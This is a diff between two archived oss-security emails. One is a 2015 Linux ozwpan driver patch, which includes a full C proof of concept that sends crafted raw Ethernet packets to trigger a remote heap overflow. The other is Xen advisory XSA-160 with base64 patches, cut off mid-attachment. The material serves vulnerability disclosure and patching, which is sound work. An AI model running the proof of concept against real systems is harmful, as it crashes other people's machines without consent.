@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5490" "Tuesday" "26" "May" "2015" "14:17:46" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1432642669-7289-2-git-send-email-Jason@zx2c4.com>" "207" "[oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow" nil nil nil "5" "2015052612:17:46" "[oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow" (number mark "U       Jason@zx2c4. May 26  207/5490  " thread-indent "\"[oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow\"\n") "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>" ("<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["16736" "Tuesday" "8" "December" "2015" "12:02:21" "+0000" "Xen.org security team" "security@xen.org" "<E1a6GyL-0003v0-Cb@xenbits.xen.org>" "347" "[oss-security] Xen Security Advisory 160 (CVE-2015-8341) - libxl leak of pv kernel and initrd on error" nil nil nil "12" "2015120812:02:21" "[oss-security] Xen Security Advisory 160 (CVE-2015-8341) - libxl leak of pv kernel and initrd on error" (number mark "U       security@xen Dec  8  347/16736 " thread-indent "\"[oss-security] Xen Security Advisory 160 (CVE-2015-8341) - libxl leak of pv kernel and initrd on error\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 19545 invoked by uid 550); 26 May 2015 12:18:37 -0000
+Received: (qmail 26452 invoked by uid 550); 8 Dec 2015 12:03:43 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,234 +12,364 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 19469 invoked from network); 26 May 2015 12:18:28 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=sDwk
-	2WY2/5ySY7qCPJhQOV8C1jU=; b=FWgY5NpKBe7pYkcqW8OsCrLMJR+Yfj1nOpEi
-	Q7ca0tmQYPgUHuSarVct8V3rhiOhZ17aIsaA+DHdO5zbJRPuInQY7XlXEBMuvaGl
-	2tfxxTQ0tQ3I6TQIn1osdrNKdMeQtJzeXuxrebKziPGOT1oMMttl2PM+vNvVlrD8
-	BgOCi/j2syCP/tSudy1hEiRokt4y998R74943lXy8ju+41h37uBGOMIVQt2iuasi
-	tyHBVZJeybUswYODMSTdMPE0wf7uFPbA+fMAzqc5JAYa18kHcL3DNlrGhnaGQra+
-	iD8fRCeN2azykcHNfBgnjBGHoso4jlU9+bykwbg/KxCRg0JALQ==
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: oss-security <oss-security@lists.openwall.com>,
-	linux-kernel@vger.kernel.org,
-	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
-	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	devel@driverdev.osuosl.org
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Tue, 26 May 2015 14:17:46 +0200
-Message-Id: <1432642669-7289-2-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.4.1
-In-Reply-To: <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
-References: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
- <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
-Subject: [oss-security] [PATCH v2 1/4] ozwpan: Use proper check to prevent heap overflow
+Received: (qmail 21580 invoked from network); 8 Dec 2015 12:02:41 -0000
+Date: Tue, 08 Dec 2015 12:02:21 +0000
+Message-Id: <E1a6GyL-0003v0-Cb@xenbits.xen.org>
+Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
+Content-Transfer-Encoding: binary
+MIME-Version: 1.0
+X-Mailer: MIME-tools 5.428 (Entity 5.428)
+To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
+ xen-users@lists.xen.org, oss-security@lists.openwall.com
+From: Xen.org security team <security@xen.org>
+CC: Xen.org security team <security@xen.org>
+Subject: [oss-security] Xen Security Advisory 160 (CVE-2015-8341) - libxl leak of pv
+ kernel and initrd on error
 
-Since elt->length is a u8, we can make this variable a u8. Then we can
-do proper bounds checking more easily. Without this, a potentially
-negative value is passed to the memcpy inside oz_hcd_get_desc_cnf,
-resulting in a remotely exploitable heap overflow with network
-supplied data.
+--=separator
+Content-Type: text/plain; charset="utf-8"
+Content-Disposition: inline
+Content-Transfer-Encoding: 7bit
 
-This could result in remote code execution. A PoC which obtains DoS
-follows below. It requires the ozprotocol.h file from this module.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-=-=-=-=-=-=
+            Xen Security Advisory CVE-2015-8341 / XSA-160
+                              version 3
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+              libxl leak of pv kernel and initrd on error
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+UPDATES IN VERSION 3
+====================
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
+Public release.
 
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
+ISSUE DESCRIPTION
+=================
 
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
+When constructing a guest which is configured to use a PV bootloader
+which runs as a userspace process in the toolstack domain
+(e.g. pygrub) libxl creates a mapping of the files to be used as
+kernel and initial ramdisk when building the guest domain.
 
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
+However if building the domain subsequently fails these mappings would
+not be released leading to a leak of virtual address space in the
+calling process, as well as preventing the recovery of the temporary
+disk files containing the kernel and initial ramdisk.
 
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+IMPACT
+======
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-	} __packed connect_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 35,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		}
-	};
+For toolstacks which manage multiple domains within the same process,
+an attacker who is able to repeatedly start a suitable domain (or many
+such domains) can cause an out-of-memory condition in the toolstack
+process, leading to a denial of service.
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_get_desc_rsp oz_get_desc_rsp;
-	} __packed pwn_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(1)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_get_desc_rsp) - 2
-		},
-		.oz_get_desc_rsp = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_GET_DESC_RSP,
-			.req_id = 0,
-			.offset = htole16(0),
-			.total_size = htole16(0),
-			.rcode = 0,
-			.data = {0}
-		}
-	};
+Under the same circumstances an attacker can also cause files to
+accumulate on the toolstack domain filesystem (usually under /var in
+dom0) used to temporarily store the kernel and initial ramdisk,
+perhaps leading to a denial of service against arbitrary other
+services using that filesystem.
 
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
+VULNERABLE SYSTEMS
+==================
 
-	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	usleep(300000);
-	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
+Both ARM and x86 systems using a libxl based toolstack are potentially
+vulnerable.
 
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozusbsvc1.c | 11 ++++++++---
- 1 file changed, 8 insertions(+), 3 deletions(-)
+Only libxl-based toolstacks which manage multiple domains in the same
+process (such as `libvirt') are vulnerable.
 
-diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
-index d434d8c..35198b9 100644
---- a/drivers/staging/ozwpan/ozusbsvc1.c
-+++ b/drivers/staging/ozwpan/ozusbsvc1.c
-@@ -390,10 +390,15 @@ void oz_usb_rx(struct oz_pd *pd, struct oz_elt *elt)
- 	case OZ_GET_DESC_RSP: {
- 			struct oz_get_desc_rsp *body =
- 				(struct oz_get_desc_rsp *)usb_hdr;
--			int data_len = elt->length -
-+			u16 offs, total_size;
-+			u8 data_len;
-+
-+			data_len = elt->length -
- 					sizeof(struct oz_get_desc_rsp) + 1;
--			u16 offs = le16_to_cpu(get_unaligned(&body->offset));
--			u16 total_size =
-+			if (data_len > elt->length)
-+				break;
-+			offs = le16_to_cpu(get_unaligned(&body->offset));
-+			total_size =
- 				le16_to_cpu(get_unaligned(&body->total_size));
- 			oz_dbg(ON, "USB_REQ_GET_DESCRIPTOR - cnf\n");
- 			oz_hcd_get_desc_cnf(usb_ctx->hport, body->req_id,
--- 
-2.4.1
+libxl-based toolstacks which manage only a single domain per process
+and which exit on failure to create a domain (such as `xl') are not
+vulnerable.
 
+Toolstacks not using libxl are not vulnerable to this issue.
+
+Only domains configured to use a PV bootloader in the toolstack domain
+(e.g. pygrub) will expose this issue.  Domains configured to use
+pvgrub (a totally different program) are not vulnerable.
+
+x86 HVM domains are not vulnerable.
+
+Systems where the kernel and initial ramdisk are provided by the host
+administrator from files in domain 0 are not vulnerable.
+
+Xen versions 4.1.x and later are vulnerable.
+
+MITIGATION
+==========
+
+Avoiding the use of the PV bootloader mechanisms which run as
+processes in the toolstack domain (pygrub), either by providing
+kernels directly from the toolstack domain or using a PV bootloader
+which runs in guest context (such as pvgrub) will prevent exposure of
+this issue.
+
+CREDITS
+=======
+
+This issue was discovered by George Dunlap of Citrix.
+
+RESOLUTION
+==========
+
+Applying the appropriate attached patch resolves this issue.
+
+xsa160.patch               xen-unstable
+xsa160-4.6.patch           Xen 4.5.x, 4.6.x
+xsa160-4.4.patch           Xen 4.3.x, 4.4.x
+
+$ sha256sum xsa160*
+470811aeead5e942d6fedad5b4e21bee85f2160b022bcab315520014b6aa39a6  xsa160.patch
+d0ce9e3c2b951ac3d25da4a0f6f232b13980625a249ed9c4cd6e9484721943a5  xsa160-4.4.patch
+40362873b7fa2c1450596ef9ea23c73f80608b77ca50b89e62daf46c131fcee6  xsa160-4.6.patch
+$
+
+DEPLOYMENT DURING EMBARGO
+=========================
+
+Deployment of the patch described above (or others which are
+substantially similar) is permitted during the embargo, even on
+public-facing systems with untrusted guest users and administrators.
+
+However deployment of the mitigations described above is not permitted
+(except where all the affected systems and VMs are administered and
+used only by organisations which are members of the Xen Project
+Security Issues Predisclosure List).  Specifically, deployment on
+public cloud systems is NOT permitted.
+
+This is because such a change to the bootloader arrangements of a PV
+guest would be a user-visible change which could lead to the
+rediscovery of the vulnerability.
+
+But: Distribution of updated software is prohibited (except to other
+members of the predisclosure list).
+
+Predisclosure list members who wish to deploy significantly different
+patches and/or mitigations, please contact the Xen Project Security
+Team.
+
+
+(Note: this during-embargo deployment notice is retained in
+post-embargo publicly released Xen Project advisories, even though it
+is then no longer applicable.  This is to enable the community to have
+oversight of the Xen Project Security Team's decisionmaking.)
+
+For more information about permissible uses of embargoed information,
+consult the Xen Project community's agreed Security Policy:
+  http://www.xenproject.org/security-policy.html
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
+
+iQEcBAEBAgAGBQJWZr8JAAoJEIP+FMlX6CvZfEYH/Rg7X9HdB+937h81tq30nrkE
+/PazyPDB8DprHL0X/IjPEQFvGOazCf45uzSzkrPXaFwu27yhbAxx/m8s94FxUjWb
+EiWwYKsb0Gh9OBejRkgiB3VMQmySWqkcjzUR1f2hk4iJ3yX8q2peRECK/Ba9aYPu
+lHN9aycnh1ORPmWPUUo8cMFhRVag1P5E77mqrxXo2nfed23xDA5GeZceg8XoT67n
+T2m59xAEwrSrHypb/XESuwtEU67CnowRcxlH7Z3EEk+ljvxOBvdovNp0yztOtArK
+EnV3UAwM+YMXvoYB4YZUQ/q9tZ1dIgyeTosOSoNHI471lBYL9QTlO22bc4+qKCE=
+=IjJr
+-----END PGP SIGNATURE-----
+
+--=separator
+Content-Type: application/octet-stream; name="xsa160.patch"
+Content-Disposition: attachment; filename="xsa160.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbSA0M2ExMGZlY2Q2ZjRhOWQ4YWRmOWY1ZDg1ZTNkNWU3MTg3ZTJkNTRh
+IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBJYW4gSmFja3NvbiA8
+aWFuLmphY2tzb25AZXUuY2l0cml4LmNvbT4KRGF0ZTogV2VkLCAxOCBOb3Yg
+MjAxNSAxNTozNDo1NCArMDAwMApTdWJqZWN0OiBbUEFUQ0hdIGxpYnhsOiBG
+aXggYm9vdGxvYWRlci1yZWxhdGVkIHZpcnR1YWwgbWVtb3J5IGxlYWsgb24g
+cHYKIGJ1aWxkIGZhaWx1cmUKClRoZSBib290bG9hZGVyIG1heSBjYWxsIGxp
+YnhsX19maWxlX3JlZmVyZW5jZV9tYXAoKSwgd2hpY2ggbW1hcCdzIHRoZQpw
+dl9rZXJuZWwgYW5kIHB2X3JhbWRpc2sgaW50byBwcm9jZXNzIG1lbW9yeS4g
+IFRoaXMgd2FzIG9ubHkgdW5tYXBwZWQsCmhvd2V2ZXIsIG9uIHRoZSBzdWNj
+ZXNzIHBhdGggb2YgbGlieGxfX2J1aWxkX3B2KCkuICBJZiB0aGVyZSB3ZXJl
+IGEKZmFpbHVyZSBhbnl3aGVyZSBiZXR3ZWVuIGxpYnhsX2Jvb3Rsb2FkZXIu
+YzpwYXJzZV9ib290bG9hZGVyX3Jlc3VsdCgpCmFuZCB0aGUgZW5kIG9mIGxp
+YnhsX19idWlsZF9wdigpLCB0aGUgY2FsbHMgdG8KbGlieGxfX2ZpbGVfcmVm
+ZXJlbmNlX3VubWFwKCkgd291bGQgYmUgc2tpcHBlZCwgbGVha2luZyB0aGUg
+bWFwcGVkCnZpcnR1YWwgbWVtb3J5LgoKSWRlYWxseSB0aGlzIHdvdWxkIGJl
+IGZpeGVkIGJ5IGFkZGluZyB0aGUgdW5tYXAgY2FsbHMgdG8gdGhlCmRlc3Ry
+dWN0aW9uIHBhdGggZm9yIGxpYnhsX19kb21haW5fYnVpbGRfc3RhdGUuICBV
+bmZvcnR1bmF0ZWx5IHRoZQpsaWZldGltZSBvZiB0aGUgbGlieGxfX2RvbWFp
+bl9idWlsZF9zdGF0ZSBpcyBvcGFxdWUsIGFuZCBpdCBkb2Vzbid0CmhhdmUg
+YSBwcm9wZXIgZGVzdHJ1Y3Rpb24gcGF0aC4gIEJ1dCwgdGhlIG9ubHkgdGhp
+bmcgaW4gaXQgdGhhdCBpc24ndApmcm9tIHRoZSBnYyBhcmUgdGhlc2UgYm9v
+dGxvYWRlciByZWZlcmVuY2VzLCBhbmQgdGhleSBhcmUgb25seSBldmVyCnNl
+dCBmb3Igb25lIGxpYnhsX19kb21haW5fYnVpbGRfc3RhdGUsIHRoZSBvbmUg
+d2hpY2ggaXMKbGlieGxfX2RvbWFpbl9jcmVhdGVfc3RhdGUuYnVpbGRfc3Rh
+dGUuCgpTbyB3ZSBjYW4gY2xlYW4gdXAgaW4gdGhlIGV4aXQgcGF0aCBmcm9t
+IGxpYnhsX19kb21haW5fY3JlYXRlXyosIHdoaWNoCmFsd2F5cyBjb21lcyB0
+aHJvdWdoIGRvbWNyZWF0ZV9jb21wbGV0ZS4KClJlbW92ZSB0aGUgbm93LXJl
+ZHVuZGFudCB1bm1hcHMgaW4gbGlieGxfX2J1aWxkX3B2J3Mgc3VjY2VzcyBw
+YXRoLgoKVGhpcyBpcyBYU0EtMTYwLgoKU2lnbmVkLW9mZi1ieTogR2Vvcmdl
+IER1bmxhcCA8Z2VvcmdlLmR1bmxhcEBjaXRyaXguY29tPgpTaWduZWQtb2Zm
+LWJ5OiBJYW4gSmFja3NvbiA8aWFuLmphY2tzb25AZXUuY2l0cml4LmNvbT4K
+VGVzdGVkLWJ5OiBHZW9yZ2UgRHVubGFwIDxnZW9yZ2UuZHVubGFwQGNpdHJp
+eC5jb20+CkFja2VkLWJ5OiBJYW4gQ2FtcGJlbGwgPGlhbi5jYW1wYmVsbEBj
+aXRyaXguY29tPgotLS0KIHRvb2xzL2xpYnhsL2xpYnhsX2NyZWF0ZS5jIHwg
+ICAgMyArKysKIHRvb2xzL2xpYnhsL2xpYnhsX2RvbS5jICAgIHwgICAgMyAt
+LS0KIDIgZmlsZXMgY2hhbmdlZCwgMyBpbnNlcnRpb25zKCspLCAzIGRlbGV0
+aW9ucygtKQoKZGlmZiAtLWdpdCBhL3Rvb2xzL2xpYnhsL2xpYnhsX2NyZWF0
+ZS5jIGIvdG9vbHMvbGlieGwvbGlieGxfY3JlYXRlLmMKaW5kZXggZjBmZWUw
+MC4uY2ViZjkwZSAxMDA2NDQKLS0tIGEvdG9vbHMvbGlieGwvbGlieGxfY3Jl
+YXRlLmMKKysrIGIvdG9vbHMvbGlieGwvbGlieGxfY3JlYXRlLmMKQEAgLTE0
+ODAsNiArMTQ4MCw5IEBAIHN0YXRpYyB2b2lkIGRvbWNyZWF0ZV9jb21wbGV0
+ZShsaWJ4bF9fZWdjICplZ2MsCiAgICAgbGlieGxfZG9tYWluX2NvbmZpZyAq
+Y29uc3QgZF9jb25maWcgPSBkY3MtPmd1ZXN0X2NvbmZpZzsKICAgICBsaWJ4
+bF9kb21haW5fY29uZmlnICpkX2NvbmZpZ19zYXZlZCA9ICZkY3MtPmd1ZXN0
+X2NvbmZpZ19zYXZlZDsKIAorICAgIGxpYnhsX19maWxlX3JlZmVyZW5jZV91
+bm1hcCgmZGNzLT5idWlsZF9zdGF0ZS5wdl9rZXJuZWwpOworICAgIGxpYnhs
+X19maWxlX3JlZmVyZW5jZV91bm1hcCgmZGNzLT5idWlsZF9zdGF0ZS5wdl9y
+YW1kaXNrKTsKKwogICAgIGlmICghcmMgJiYgZF9jb25maWctPmJfaW5mby5l
+eGVjX3NzaWRyZWYpCiAgICAgICAgIHJjID0geGNfZmxhc2tfcmVsYWJlbF9k
+b21haW4oQ1RYLT54Y2gsIGRjcy0+Z3Vlc3RfZG9taWQsIGRfY29uZmlnLT5i
+X2luZm8uZXhlY19zc2lkcmVmKTsKIApkaWZmIC0tZ2l0IGEvdG9vbHMvbGli
+eGwvbGlieGxfZG9tLmMgYi90b29scy9saWJ4bC9saWJ4bF9kb20uYwppbmRl
+eCA0NGQ0ODFiLi44ODcyMTk3IDEwMDY0NAotLS0gYS90b29scy9saWJ4bC9s
+aWJ4bF9kb20uYworKysgYi90b29scy9saWJ4bC9saWJ4bF9kb20uYwpAQCAt
+NzY3LDkgKzc2Nyw2IEBAIGludCBsaWJ4bF9fYnVpbGRfcHYobGlieGxfX2dj
+ICpnYywgdWludDMyX3QgZG9taWQsCiAgICAgICAgIHN0YXRlLT5zdG9yZV9t
+Zm4gPSB4Y19kb21fcDJtKGRvbSwgZG9tLT54ZW5zdG9yZV9wZm4pOwogICAg
+IH0KIAotICAgIGxpYnhsX19maWxlX3JlZmVyZW5jZV91bm1hcCgmc3RhdGUt
+PnB2X2tlcm5lbCk7Ci0gICAgbGlieGxfX2ZpbGVfcmVmZXJlbmNlX3VubWFw
+KCZzdGF0ZS0+cHZfcmFtZGlzayk7Ci0KICAgICByZXQgPSAwOwogb3V0Ogog
+ICAgIHhjX2RvbV9yZWxlYXNlKGRvbSk7Ci0tIAoxLjcuMTAuNAoK
+
+--=separator
+Content-Type: application/octet-stream; name="xsa160-4.4.patch"
+Content-Disposition: attachment; filename="xsa160-4.4.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbSA3ZjlmZDE0YzgwYjcxYjRhYmJjYTM2ZjI3NDdkMmU3NWRmZWJjMjg5
+IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBJYW4gSmFja3NvbiA8
+aWFuLmphY2tzb25AZXUuY2l0cml4LmNvbT4KRGF0ZTogV2VkLCAxOCBOb3Yg
+MjAxNSAxNTozNDo1NCArMDAwMApTdWJqZWN0OiBbUEFUQ0hdIGxpYnhsOiBG
+aXggYm9vdGxvYWRlci1yZWxhdGVkIHZpcnR1YWwgbWVtb3J5IGxlYWsgb24g
+cHYKIGJ1aWxkIGZhaWx1cmUKClRoZSBib290bG9hZGVyIG1heSBjYWxsIGxp
+YnhsX19maWxlX3JlZmVyZW5jZV9tYXAoKSwgd2hpY2ggbW1hcCdzIHRoZQpw
+dl9rZXJuZWwgYW5kIHB2X3JhbWRpc2sgaW50byBwcm9jZXNzIG1lbW9yeS4g
+IFRoaXMgd2FzIG9ubHkgdW5tYXBwZWQsCmhvd2V2ZXIsIG9uIHRoZSBzdWNj
+ZXNzIHBhdGggb2YgbGlieGxfX2J1aWxkX3B2KCkuICBJZiB0aGVyZSB3ZXJl
+IGEKZmFpbHVyZSBhbnl3aGVyZSBiZXR3ZWVuIGxpYnhsX2Jvb3Rsb2FkZXIu
+YzpwYXJzZV9ib290bG9hZGVyX3Jlc3VsdCgpCmFuZCB0aGUgZW5kIG9mIGxp
+YnhsX19idWlsZF9wdigpLCB0aGUgY2FsbHMgdG8KbGlieGxfX2ZpbGVfcmVm
+ZXJlbmNlX3VubWFwKCkgd291bGQgYmUgc2tpcHBlZCwgbGVha2luZyB0aGUg
+bWFwcGVkCnZpcnR1YWwgbWVtb3J5LgoKSWRlYWxseSB0aGlzIHdvdWxkIGJl
+IGZpeGVkIGJ5IGFkZGluZyB0aGUgdW5tYXAgY2FsbHMgdG8gdGhlCmRlc3Ry
+dWN0aW9uIHBhdGggZm9yIGxpYnhsX19kb21haW5fYnVpbGRfc3RhdGUuICBV
+bmZvcnR1bmF0ZWx5IHRoZQpsaWZldGltZSBvZiB0aGUgbGlieGxfX2RvbWFp
+bl9idWlsZF9zdGF0ZSBpcyBvcGFxdWUsIGFuZCBpdCBkb2Vzbid0CmhhdmUg
+YSBwcm9wZXIgZGVzdHJ1Y3Rpb24gcGF0aC4gIEJ1dCwgdGhlIG9ubHkgdGhp
+bmcgaW4gaXQgdGhhdCBpc24ndApmcm9tIHRoZSBnYyBhcmUgdGhlc2UgYm9v
+dGxvYWRlciByZWZlcmVuY2VzLCBhbmQgdGhleSBhcmUgb25seSBldmVyCnNl
+dCBmb3Igb25lIGxpYnhsX19kb21haW5fYnVpbGRfc3RhdGUsIHRoZSBvbmUg
+d2hpY2ggaXMKbGlieGxfX2RvbWFpbl9jcmVhdGVfc3RhdGUuYnVpbGRfc3Rh
+dGUuCgpTbyB3ZSBjYW4gY2xlYW4gdXAgaW4gdGhlIGV4aXQgcGF0aCBmcm9t
+IGxpYnhsX19kb21haW5fY3JlYXRlXyosIHdoaWNoCmFsd2F5cyBjb21lcyB0
+aHJvdWdoIGRvbWNyZWF0ZV9jb21wbGV0ZS4KClJlbW92ZSB0aGUgbm93LXJl
+ZHVuZGFudCB1bm1hcHMgaW4gbGlieGxfX2J1aWxkX3B2J3Mgc3VjY2VzcyBw
+YXRoLgoKVGhpcyBpcyBYU0EtMTYwLgoKU2lnbmVkLW9mZi1ieTogR2Vvcmdl
+IER1bmxhcCA8Z2VvcmdlLmR1bmxhcEBjaXRyaXguY29tPgpTaWduZWQtb2Zm
+LWJ5OiBJYW4gSmFja3NvbiA8aWFuLmphY2tzb25AZXUuY2l0cml4LmNvbT4K
+VGVzdGVkLWJ5OiBHZW9yZ2UgRHVubGFwIDxnZW9yZ2UuZHVubGFwQGNpdHJp
+eC5jb20+CkFja2VkLWJ5OiBJYW4gQ2FtcGJlbGwgPGlhbi5jYW1wYmVsbEBj
+aXRyaXguY29tPgotLS0KIHRvb2xzL2xpYnhsL2xpYnhsX2NyZWF0ZS5jIHwg
+ICAgMyArKysKIHRvb2xzL2xpYnhsL2xpYnhsX2RvbS5jICAgIHwgICAgMyAt
+LS0KIDIgZmlsZXMgY2hhbmdlZCwgMyBpbnNlcnRpb25zKCspLCAzIGRlbGV0
+aW9ucygtKQoKZGlmZiAtLWdpdCBhL3Rvb2xzL2xpYnhsL2xpYnhsX2NyZWF0
+ZS5jIGIvdG9vbHMvbGlieGwvbGlieGxfY3JlYXRlLmMKaW5kZXggZTMzNTBk
+NS4uNTI5MmMxNSAxMDA2NDQKLS0tIGEvdG9vbHMvbGlieGwvbGlieGxfY3Jl
+YXRlLmMKKysrIGIvdG9vbHMvbGlieGwvbGlieGxfY3JlYXRlLmMKQEAgLTEy
+OTUsNiArMTI5NSw5IEBAIHN0YXRpYyB2b2lkIGRvbWNyZWF0ZV9jb21wbGV0
+ZShsaWJ4bF9fZWdjICplZ2MsCiAgICAgU1RBVEVfQU9fR0MoZGNzLT5hbyk7
+CiAgICAgbGlieGxfZG9tYWluX2NvbmZpZyAqY29uc3QgZF9jb25maWcgPSBk
+Y3MtPmd1ZXN0X2NvbmZpZzsKIAorICAgIGxpYnhsX19maWxlX3JlZmVyZW5j
+ZV91bm1hcCgmZGNzLT5idWlsZF9zdGF0ZS5wdl9rZXJuZWwpOworICAgIGxp
+YnhsX19maWxlX3JlZmVyZW5jZV91bm1hcCgmZGNzLT5idWlsZF9zdGF0ZS5w
+dl9yYW1kaXNrKTsKKwogICAgIGlmICghcmMgJiYgZF9jb25maWctPmJfaW5m
+by5leGVjX3NzaWRyZWYpCiAgICAgICAgIHJjID0geGNfZmxhc2tfcmVsYWJl
+bF9kb21haW4oQ1RYLT54Y2gsIGRjcy0+Z3Vlc3RfZG9taWQsIGRfY29uZmln
+LT5iX2luZm8uZXhlY19zc2lkcmVmKTsKIApkaWZmIC0tZ2l0IGEvdG9vbHMv
+bGlieGwvbGlieGxfZG9tLmMgYi90b29scy9saWJ4bC9saWJ4bF9kb20uYwpp
+bmRleCA1MmJjMDFhLi45NzhhMWViIDEwMDY0NAotLS0gYS90b29scy9saWJ4
